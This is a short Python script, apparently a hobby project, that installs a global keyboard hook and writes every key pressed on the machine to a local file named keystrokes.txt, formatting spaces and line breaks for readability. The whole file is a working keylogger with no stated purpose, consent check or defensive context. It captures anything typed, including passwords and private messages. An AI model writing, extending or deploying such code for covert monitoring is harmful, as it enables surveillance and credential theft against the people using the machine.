import keyboard

log_file = 'keystrokes.txt'

def on_key_press(event):
    with open(log_file, 'a') as f:
        # capture spaces and enters and format them appropriately for better readability
        if event.name == "space":
            f.write(' ')
        elif event.name == "enter":
            f.write('\n')
        else: # write onto the log_file file
            f.write('{}'.format(event.name))
            
    # individially print each key for testing
    #print("entered: " + event.name)

keyboard.on_press(on_key_press)

keyboard.wait()